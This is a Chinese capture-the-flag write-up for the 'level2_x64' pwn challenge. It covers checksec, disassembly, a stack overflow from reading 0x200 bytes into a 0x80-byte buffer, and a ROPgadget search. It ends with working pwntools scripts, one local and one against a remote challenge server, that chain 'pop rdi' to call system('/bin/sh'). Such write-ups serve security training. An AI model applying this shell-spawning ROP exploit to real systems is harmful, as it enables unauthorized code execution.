`pwngdb` 查看 `checksec`，值开了 NX 保护

```
pwndbg> checksec
[*] '/home/kali/桌面/level2_x64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`info functions` 查询函数，发现 `main` 函数

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400488  _init
0x00000000004004c0  system@plt
0x00000000004004d0  read@plt
0x00000000004004e0  __libc_start_main@plt
0x00000000004004f0  __gmon_start__@plt
0x0000000000400500  _start
0x0000000000400530  deregister_tm_clones
0x0000000000400570  register_tm_clones
0x00000000004005b0  __do_global_dtors_aux
0x00000000004005d0  frame_dummy
0x00000000004005f6  vulnerable_function
0x0000000000400620  main
0x0000000000400650  __libc_csu_init
0x00000000004006c0  __libc_csu_fini
0x00000000004006c4  _fini
```

`disassemble main` 查看 `main` 函数

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000400620 <+0>:     push   rbp
   0x0000000000400621 <+1>:     mov    rbp,rsp
   0x0000000000400624 <+4>:     sub    rsp,0x10
   0x0000000000400628 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x000000000040062b <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x000000000040062f <+15>:    mov    eax,0x0
   0x0000000000400634 <+20>:    call   0x4005f6 <vulnerable_function>
   0x0000000000400639 <+25>:    mov    edi,0x4006e0
   0x000000000040063e <+30>:    call   0x4004c0 <system@plt>
   0x0000000000400643 <+35>:    leave
   0x0000000000400644 <+36>:    ret
End of assembler dump.
```

未发现明显漏洞点，查看 `vulnerable_function` 函数

```
pwndbg> disassemble vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x00000000004005f6 <+0>:     push   rbp
   0x00000000004005f7 <+1>:     mov    rbp,rsp
   0x00000000004005fa <+4>:     add    rsp,0xffffffffffffff80
   0x00000000004005fe <+8>:     mov    edi,0x4006d4
   0x0000000000400603 <+13>:    call   0x4004c0 <system@plt>
   0x0000000000400608 <+18>:    lea    rax,[rbp-0x80]
   0x000000000040060c <+22>:    mov    edx,0x200
   0x0000000000400611 <+27>:    mov    rsi,rax
   0x0000000000400614 <+30>:    mov    edi,0x0
   0x0000000000400619 <+35>:    call   0x4004d0 <read@plt>
   0x000000000040061e <+40>:    leave
   0x000000000040061f <+41>:    ret
End of assembler dump.
```

发现关键函数 `system` 和 `read`，`x/s 0x4006d4` 查看 `system` 的参数 `0x4006d4`

```
pwndbg> x/s 0x4006d4
0x4006d4:       "echo Input:"
```

意思是调用 `system` 函数输出 `Input:`

`read` 函数可读入 `0x200` 个字节而栈中仅 `0x80` 个字节，此处存在栈溢出

查找 `/bin/sh` 字符串

```
pwndbg> search '/bin/sh'
Searching for value: '/bin/sh'
level2_x64      0x400a90 0x68732f6e69622f /* '/bin/sh' */
level2_x64      0x600a90 0x68732f6e69622f /* '/bin/sh' */
libc.so.6       0x7ffff7f5b04f 0x68732f6e69622f /* '/bin/sh' */
```

存在 `/bin/sh` 字符串和 `system` 函数，可以构建 ROP 脚本

使用 `ROPgadget` 查找 `pop rdi`（为了清空 `rdi` 寄存器方便函数传参）

```
┌──(kali㉿kali)-[~/桌面]
└─$ ROPgadget --binary ./level2_x64 | grep 'pop rdi'               
/usr/local/bin/ROPgadget:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('ROPGadget==7.4', 'ROPgadget')
0x00000000004006b3 : pop rdi ; ret
```

编写 `payload` 脚本，`payload` 处先占满栈中的 `0x80` 个字节的空间，然后用 `0x8` 个字节覆盖 `rbp`，接下来用 `pop rdi; ret` 清空 `rdi` 寄存器中的值（因为 `x64` 程序的前六个参数借用 `rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9` 这六个寄存器传参，所以清空 `rdi` 中的值方便之后传参），再传入 `/bin/sh` 字符串的地址，最终调用 `system` 函数，实现函数 `system('/bin/sh')` 的调用

```python
# 本地程序调试
from pwn import *
r = process('/home/kali/桌面/level2_x64')

system = 0x40063e
binsh = 0x400a90
poprdi = 0x4006b3

payload = b'a' * 0x80 + b'b' * 8 + p64(poprdi) + p64(binsh) + p64(system) 

r.sendlineafter(b'Input:\n', payload)
r.interactive()
```

```python
# 远程连接获取 flag
from pwn import *
r = remote("node5.buuoj.cn", 29271)

system = 0x40063e
binsh = 0x400a90
poprdi = 0x4006b3

payload = b'a' * 0x80 + b'b' * 8 + p64(poprdi) + p64(binsh) + p64(system) 

r.sendlineafter(b'Input:\n', payload)
r.interactive()
```

获得 `flag`

![image.png](https://gitee.com/chpocenkey/images/raw/master/20240512202612.png)